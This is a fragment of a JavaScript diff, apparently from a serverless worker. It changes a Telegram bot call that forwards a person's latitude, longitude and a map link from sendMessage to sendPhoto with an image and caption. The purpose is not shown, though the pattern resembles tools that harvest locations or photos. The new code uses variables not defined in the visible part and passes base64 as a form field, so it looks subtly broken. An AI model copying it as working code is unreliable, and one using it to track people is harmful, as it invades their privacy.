@@ -41,15 +41,16 @@ Lng: ${data.lng}
 
 🔗 <a href="https://maps.google.com/?q=${data.lat},${data.lng}">Open Map</a>
 `;
-  await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-      chat_id: env.CHAT_ID,
-      text: msg
-    })
-  });
-
+  await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
+  method: "POST",
+  body: new URLSearchParams({
+    chat_id: env.CHAT_ID,
+    photo: imageBase64,
+    caption: text,
+    parse_mode: "HTML"
+  })
+});
+  
   if (s.image) {
     const blob = await (await fetch(s.image)).blob();
     const form = new FormData();
